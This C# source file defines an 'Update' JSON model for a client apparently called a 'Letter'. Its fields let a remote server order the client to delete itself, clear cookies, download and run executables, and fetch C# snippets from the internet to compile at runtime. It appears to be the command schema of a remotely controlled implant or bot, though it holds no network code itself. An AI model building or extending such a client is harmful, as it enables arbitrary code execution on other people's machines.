using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Communication.JSON_Models
{
    public class Update
    {
        public int UpdateVersion = 0;
        public float LetterVersion = 0.1f;

        /// <summary>
        /// Link to the newest Letter.
        /// </summary>
        public string DownloadLink;

        /// <summary>
        /// True if the letter is to self-destruct immediately.
        /// </summary>
        public bool KillSelf = false;

        public bool ClearCookies = false;

        /// <summary>
        /// Links of applications to download and run. Should directly point to executables.
        /// </summary>
        public List<Tuple<string /* link to exec */, float /* version */>> Runnables 
            = new List<Tuple<string, float>>();

        /// <summary>
        /// Links to raw plaintext files containing code snippets (in C#) that will be compiled
        /// at runtime.
        /// </summary>
        public List<Tuple<string /* link to plaintext from internet */, float /* version */>> Snippets
            = new List<Tuple<string, float>>();
    }
}
